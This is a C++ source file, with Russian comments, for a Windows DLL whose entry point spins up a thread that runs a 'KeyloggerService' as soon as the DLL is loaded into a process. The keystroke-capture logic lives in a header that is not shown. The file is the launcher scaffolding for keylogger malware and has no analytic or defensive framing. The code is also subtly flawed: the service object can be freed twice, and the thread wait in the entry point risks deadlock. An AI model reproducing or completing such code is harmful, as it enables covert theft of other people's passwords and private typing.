#include <Windows.h>
#include "KeyloggerService.h"

// Глобальная переменная для механизма событий
HANDLE hEvent;
KeyloggerService* myApp;

DWORD WINAPI myThreadFunc(LPVOID lpParam)
{
    OutputDebugString(TEXT("myThreadFunc is running\n"));
    const std::vector<std::string> args;
    myApp = new KeyloggerService();
    // Инициализируем приложениу
    try
    {
        // Инициализируем приложение
        //myApp.initialize();

        // Запускаем приложение
        //myApp.initialize();
        myApp->main();
        myApp->uninitialize();
        
        // Очищаем ресурсы
        //myApp.uninitialize();
    }
    catch (std::exception e)
    {
        std::string s = std::string(e.what());
        std::wstring str = std::wstring(s.begin(), s.end());
        OutputDebugString(str.c_str());
    }
    // Ожидаем событие на освобождение ресурсов
    WaitForSingleObject(hEvent, INFINITE);
    if (myApp)delete myApp;
    return 0;
}

HANDLE hThread;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Создаем событие
        hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

        // Создаем поток, который будет выполнять бесконечную функцию
        hThread = CreateThread(NULL, 0, myThreadFunc, NULL, 0, NULL);
        
        // Проверяем успешность создания потока
        if (hThread == NULL)
        {
            // Обработка ошибки
            return FALSE;
        }
        break;
    case DLL_PROCESS_DETACH:
        // Сигнализируем потоку, что нужно завершить работу
        SetEvent(hEvent);
        
        // Ждем завершения потока
        WaitForSingleObject(hThread, INFINITE);
        if (myApp)delete myApp;
        // Закрываем дескриптор события и потока
        CloseHandle(hEvent);
        CloseHandle(hThread);

        break;
    }
    return TRUE;
}